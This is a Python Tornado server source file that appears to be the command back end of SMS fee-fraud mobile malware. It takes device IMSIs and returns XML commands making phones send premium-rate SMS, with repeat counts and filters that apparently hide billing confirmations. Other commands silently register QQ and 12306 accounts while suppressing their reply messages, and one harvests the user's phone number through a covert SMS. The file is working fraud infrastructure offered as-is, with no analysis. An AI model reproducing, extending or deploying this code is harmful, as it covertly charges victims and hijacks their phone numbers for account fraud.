# coding: utf-8

import tornado.ioloop
import tornado.web
import struct
import torndb
import time
import sys
import geoip2.database
import threading
import random

# private lib
import config
import public

from Bastion import _test
import MySQLdb
from DBUtils.PooledDB import PooledDB
reload(sys)
sys.setdefaultencoding("utf-8")

poolConfig = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['config_db']['host'], user=config.GLOBAL_SETTINGS['config_db']['user'], passwd=config.GLOBAL_SETTINGS[
                      'config_db']['psw'], db=config.GLOBAL_SETTINGS['config_db']['name'], port=config.GLOBAL_SETTINGS['config_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
poolLog = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['log_db']['host'], user=config.GLOBAL_SETTINGS['log_db']['user'], passwd=config.GLOBAL_SETTINGS[
    'log_db']['psw'], db=config.GLOBAL_SETTINGS['log_db']['name'], port=config.GLOBAL_SETTINGS['log_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
systemConfigs = {}

MATCH_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
MATCH_CONTENT += "<wml>"
MATCH_CONTENT += "<card>"
MATCH_CONTENT += "<Ccmd_cust>zp[id]</Ccmd_cust>"
MATCH_CONTENT += "<Cnum_cust>[mobile]</Cnum_cust>"
MATCH_CONTENT += "<filter1_cust></filter1_cust>"
MATCH_CONTENT += "<filter2_cust></filter2_cust>"
MATCH_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
MATCH_CONTENT += "<fee></fee>"
MATCH_CONTENT += "<autofee></autofee>"
MATCH_CONTENT += "<feemode>-2</feemode>"
MATCH_CONTENT += "</card>"
MATCH_CONTENT += "</wml>"

FEE_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
FEE_CONTENT += "<wml>"
FEE_CONTENT += "<card>"
FEE_CONTENT += "<Ccmd_cust>[cmd]</Ccmd_cust>"
FEE_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
FEE_CONTENT += "<filter1_cust>[filter]</filter1_cust>"
FEE_CONTENT += "<filter2_cust></filter2_cust>"
FEE_CONTENT += "<Creconfirm_cust>[reconfirm]</Creconfirm_cust>"
FEE_CONTENT += "<PortShield>[portShield]</PortShield>"
FEE_CONTENT += "<fee></fee>"
FEE_CONTENT += "<autofee>[times]</autofee>"
FEE_CONTENT += "<feemode>11</feemode>"
FEE_CONTENT += "</card>"
FEE_CONTENT += "</wml>"

SMS_REGISTER_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
SMS_REGISTER_CONTENT += "<wml>"
SMS_REGISTER_CONTENT += "<card>"
SMS_REGISTER_CONTENT += "<Ccmd_cust>[cmd]</Ccmd_cust>"
SMS_REGISTER_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
SMS_REGISTER_CONTENT += "<filter1_cust>[filter]</filter1_cust>"
SMS_REGISTER_CONTENT += "<filter2_cust></filter2_cust>"
SMS_REGISTER_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
SMS_REGISTER_CONTENT += "<PortShield>[portShield]</PortShield>"
SMS_REGISTER_CONTENT += "<fee></fee>"
SMS_REGISTER_CONTENT += "<autofee>1</autofee>"
SMS_REGISTER_CONTENT += "<feemode>11</feemode>"
SMS_REGISTER_CONTENT += "</card>"
SMS_REGISTER_CONTENT += "</wml>"

TEST_CONTENT = ""

MATCH_FLOW_LIMIT_PER_MINUTE = {'minute': 0, 'count': 0}
TRY_MORE_TIMES = 2


def match_flow_control():
    global MATCH_FLOW_LIMIT_PER_MINUTE
    _current_minute = int(time.strftime("%M", time.localtime()))
    if MATCH_FLOW_LIMIT_PER_MINUTE['minute'] != _current_minute:
        MATCH_FLOW_LIMIT_PER_MINUTE = {'minute': _current_minute, 'count': 0}
    if MATCH_FLOW_LIMIT_PER_MINUTE['count'] < int(get_system_parameter_from_db("matchFlowLimitPerMinute")):
        MATCH_FLOW_LIMIT_PER_MINUTE['count'] += 1
        return True
    else:
        return False


class MatchHandler(tornado.web.RequestHandler):

    def get(self):
        _dbConfig = poolConfig.connection()
        _cur = _dbConfig.cursor()
        _sql = 'SELECT imsi FROM `imsi_users` WHERE id = %s '
        _cur.execute(_sql, (self.get_argument('id')))
        _recordRsp = _cur.fetchone()
        if _recordRsp != None:
            _sql = "update `imsi_users` set mobile=%s where id = %s"
            _cur.execute(_sql, (self.get_argument(
                'mobile'), self.get_argument('id')))
        _cur.close()
        _dbConfig.close()


class MainHandler(tornado.web.RequestHandler):

    def get(self):
        self.write("Hello, world")

    def post(self, *args, **kwargs):
        threads = []
        _begin_time = int(round(time.time() * 1000))
        reqInfo = {}
        reqInfo["imsi"] = self.request.body[64:80]
        reqInfo["custCode"] = (str(self.request.body[32:47])).strip()
        reqInfo["proCode"] = (str(self.request.body[48:63])).strip()
        # reqInfo["ip"] = self.request.headers["X-Real-IP"]
        reqInfo["ip"] = self.request.remote_ip
        # insert_req_log(reqInfo)
        _test_imsi_info = check_test_imsi(reqInfo["imsi"])
        if _test_imsi_info == None:
            # process normal user
            _rsp_content = get_imsi_response(reqInfo["imsi"], threads)
            if _rsp_content != None:
                print(_rsp_content)
                self.write(_rsp_content)
        else:
            self.write(get_test_response(_test_imsi_info))
        print("tcd spent:" + str(int(round(time.time() * 1000)) - _begin_time))
        self.finish()
        threads.append(threading.Thread(target=insert_req_log(reqInfo)))
        for t in threads:
            t.start()
        print("current has %d threads" % (threading.activeCount() - 1))


def get_imsi_response(_imsi, _threads):
    _return = ""
    _imsi = filter(str.isdigit, _imsi)
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth ,lastRegisterCmdAppIdList,ifnull(registerQqCmdCount,0) as registerQqCmdCount,ifnull(registerQqSuccessCount,0) as registerQqSuccessCount,ifnull(register12306CmdCount,0) as register12306CmdCount,ifnull(register12306SuccessCount,0) as register12306SuccessCount FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
    _cur.execute(_sql, (_imsi))
    _record_user = _cur.fetchone()
    print(_record_user)
    if _record_user == None:
        _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
        _cur.execute(_sql, (_imsi, time.time()))
        _sql = "SELECT LAST_INSERT_ID() as id"
        _cur.execute(_sql)
        _record_user = _cur.fetchone()
        if _record_user != None and match_flow_control():
            _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                '[mobile]', get_system_parameter_from_db("matchMobile"))
    else:
        if len(str(_record_user['mobile'])) <= 10 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsi")):
            _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                '[mobile]', get_system_parameter_from_db("matchMobile"))
            _threads.append(threading.Thread(
                target=async_update_match_count(_imsi)))
        else:
            # normal fee process
            if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour():
                _return = get_cmd(_record_user, _threads)
            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open':
                _return = get_register_cmd(_record_user, _threads)
                if _return != None:
                    _threads.append(threading.Thread(
                        target=insert_register_cmd_log(_record_user, _return)))
    _cur.close()
    _dbConfig.close()
    return _return


def isOpenHour():
    _result = True
    _hour = int(time.strftime("%H", time.localtime()))
    if _hour == 23 or (_hour >= 0 and _hour <= 7):
        _result = False
    return _result


def isOpenSmsRegisterHour(_keyword):
    _result = True
    _hour = int(time.strftime("%H", time.localtime()))
    if not(_hour >= int(get_system_parameter_from_db("registerSmsCmdOpenHour" + _keyword)) and _hour <= int(get_system_parameter_from_db("registerSmsCmdCloseHour" + _keyword))):
        _result = False
    return _result


def async_update_match_count(_imsi):
    _dbConfig = poolConfig.connection()
    _sql = "update imsi_users set matchCount=matchCount+1 where imsi=%s"
    _dbConfig.cursor().execute(_sql, (_imsi))
    _dbConfig.close()


def get_cmd(_user, _threads):
    if _user['province'] != None and len(_user['province']) > 0:
        _dbConfig = poolConfig.connection()
        _cur = _dbConfig.cursor()
        _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and sms_cmd_covers.state = \'open\' and sms_cmd_configs.state = \'open\' order by rand() limit 1 '
        _cur.execute(_sql, (_user['province'], _user['mobileType']))
        _record = _cur.fetchone()
        print(_record)
        _cur.close()
        _dbConfig.close()
        if _record == None:
            return None
        else:
            _threads.append(threading.Thread(
                target=async_update_cmd_fee(_user, _record)))
            _current_cmd_content = FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace(
                '[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
            _threads.append(threading.Thread(
                target=insert_fee_cmd_log(_user, _record, _current_cmd_content)))
            return _current_cmd_content
    else:
        print('can not match province' + str(_user))
        return None


# 获取短信注册类指令


def get_register_cmd(_user, _threads):
    _result = None
    if isOpenSmsRegisterHour('Qq') and str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1 and int(get_system_parameter_from_db("qqRegisterLimit")) > 0 and int(_user['registerQqCmdCount']) <= (int(get_system_parameter_from_db("qqRegisterLimit")) + TRY_MORE_TIMES) and int(_user['registerQqSuccessCount']) < int(get_system_parameter_from_db("qqRegisterLimit")):
        _result = SMS_REGISTER_CONTENT.replace(
            '[cmd]', 'ZC').replace('[spNumber]', '10690700511').replace('[filter]', '腾讯科技|随时随地|QQ|qq')
        if _user['mobileType'] == "ChinaUnion":
            _result = _result.replace('[portShield]', '10690188')
            _threads.append(threading.Thread(
                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
        elif _user['mobileType'] == "ChinaMobile":
            _result = _result.replace('[portShield]', '10690508')
            _threads.append(threading.Thread(
                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
        else:
            _result = None
    elif isOpenSmsRegisterHour('12306') and str(_user['lastRegisterCmdAppIdList']).find(',5,') != -1 and int(get_system_parameter_from_db("12306RegisterLimit")) > 0 and int(_user['register12306CmdCount']) <= (int(get_system_parameter_from_db("12306RegisterLimit")) + TRY_MORE_TIMES) and int(_user['register12306SuccessCount']) < int(get_system_parameter_from_db("12306RegisterLimit")):
        _result = SMS_REGISTER_CONTENT.replace('[cmd]', '999').replace(
            '[spNumber]', '12306').replace('[filter]', '12306|铁路客服').replace('[portShield]', '12306')
        _threads.append(threading.Thread(
            target=async_update_register_cmd_count(_user, 'register12306CmdCount')))
    else:
        _result = None
    return _result


def async_update_cmd_fee(_user, _cmd):
    _time_current = time.time()
    _total = _cmd['price'] * _cmd['times']
    if public.is_same_month(_time_current, _user['lastCmdTime']):
        _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0)  + %s , cmdFeeSumMonth = ifnull(cmdFeeSumMonth,0) + %s where imsi = %s '
    else:
        _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0) + %s , cmdFeeSumMonth = %s where imsi = %s '
    _dbConfig = poolConfig.connection()
    _dbConfig.cursor().execute(_sql, (_time_current,
                                      _total, _total, _user['imsi']))
    _dbConfig.close()


def async_update_register_cmd_count(_user, _paraNmae):
    _sql = 'update imsi_users set ' + _paraNmae + \
        ' = ifnull(' + _paraNmae + ',0)  + 1  where imsi = %s '
    _dbConfig = poolConfig.connection()
    _dbConfig.cursor().execute(_sql, (_user['imsi']))
    _dbConfig.close()


def check_user_cmd_fee(_user):
    if _user['cmdFeeSumMonth'] == None:
        return True
    elif int(_user['cmdFeeSumMonth']) < int(get_system_parameter_from_db('cmdFeeMonthLimit')):
        return True
    elif int(time.strftime("%m", time.localtime(int(_user['lastCmdTime'])))) != int(time.strftime("%m", time.localtime())):
        return True
    else:
        return False


def insert_req_log(_reqInfo):
    imsi = filter(str.isdigit, _reqInfo["imsi"])
    reader = geoip2.database.Reader(
        config.GLOBAL_SETTINGS['geoip2_db_file_path'])
    response = reader.city(_reqInfo["ip"])
    _dbLog = poolLog.connection()
    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
    _dbLog.cursor().execute(_sql, (long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 1, imsi, _reqInfo[
        "ip"], response.subdivisions.most_specific.name, response.city.name, _reqInfo["custCode"], _reqInfo["proCode"]))
    _dbLog.close()
    return


def insert_fee_cmd_log(_user, _fee_cmd, _cmd_info):
    _dbLog = poolLog.connection()
    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
    _dbLog.cursor().execute(_sql, (long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 201,
                                   _user["imsi"], _fee_cmd["id"], _fee_cmd["spNumber"], _fee_cmd["msg"], _user["mobile"], _cmd_info))
    _dbLog.close()
    return


def insert_register_cmd_log(_user, _cmd_info):
    _dbLog = poolLog.connection()
    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`) values (%s,%s,%s,%s,%s)'
    _dbLog.cursor().execute(_sql, (long(round(time.time() * 1000)) * 10000 +
                                   random.randint(0, 9999), 202, _user["imsi"], _user["mobile"], _cmd_info))
    _dbLog.close()
    return


def get_system_parameter_from_db(_title):
    return systemConfigs[_title]


def cache_system_parameter():
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT * FROM `system_configs` '
    _cur.execute(_sql)
    _recordRsp = _cur.fetchall()
    for _t in _recordRsp:
        systemConfigs[_t['title']] = _t['detail']
    print(systemConfigs)
    _cur.close()
    _dbConfig.close()
    return


def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
        (r"/tcd/", MainHandler),
        (r"/match/", MatchHandler),
    ])


def get_test_response(_imsi_info):
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
    _cur.execute(_sql, (_imsi_info['imsi'], _imsi_info['testStatus']))
    _recordRsp = _cur.fetchone()
    if _recordRsp == None:
        _sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
        _cur.execute(_sql, ("def", _imsi_info['testStatus']))
        _recordRsp = _cur.fetchone()
    else:
        print(_recordRsp)
    _cur.close()
    _dbConfig.close()
    return _recordRsp['response'].replace("IMSIimsi", _imsi_info['imsi'])


def check_test_imsi(_imsi):
    imsi = filter(str.isdigit, _imsi)
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT imsi,testStatus FROM test_imsis WHERE imsi = %s'
    _cur.execute(_sql, (imsi))
    _record = _cur.fetchone()
    _cur.close()
    _dbConfig.close()
    return _record

if __name__ == "__main__":
    print("begin...")
    app = make_app()
    app.listen(config.GLOBAL_SETTINGS['port'], xheaders=True)
    cache_system_parameter()
    tornado.ioloop.PeriodicCallback(cache_system_parameter, 6000).start()
    tornado.ioloop.IOLoop.current().start()
